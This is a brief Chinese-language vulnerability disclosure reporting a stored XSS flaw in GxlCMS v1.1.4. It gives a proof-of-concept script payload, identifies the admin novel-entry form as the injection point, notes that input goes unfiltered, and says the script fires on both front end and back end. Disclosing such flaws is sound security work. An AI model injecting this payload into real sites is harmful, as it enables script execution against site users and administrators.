






# GxlCMS v1.1.4存在储存xss漏洞

漏洞POC

`123"123>undefined<script>alert(12)</script>`

漏洞位置

​       在`添加小说数据界面`可以输入POC导致XSS触发

http://127.0.0.1/gxl/index.php?s=Admin-Index

![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1g0s0t0zn96j30qc0fgjrw.jpg)

漏洞分析

![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1g0s0t0zvhvj30lt0aswfs.jpg)

![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1g0s0t0zwrcj30yr0aa0tn.jpg)

发现未对代码进行过滤

漏洞证明

![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1g0s0t1034ej31700d1wgf.jpg)

前台后台均可触发XSS
产品官网
http://www.gxlcms.com
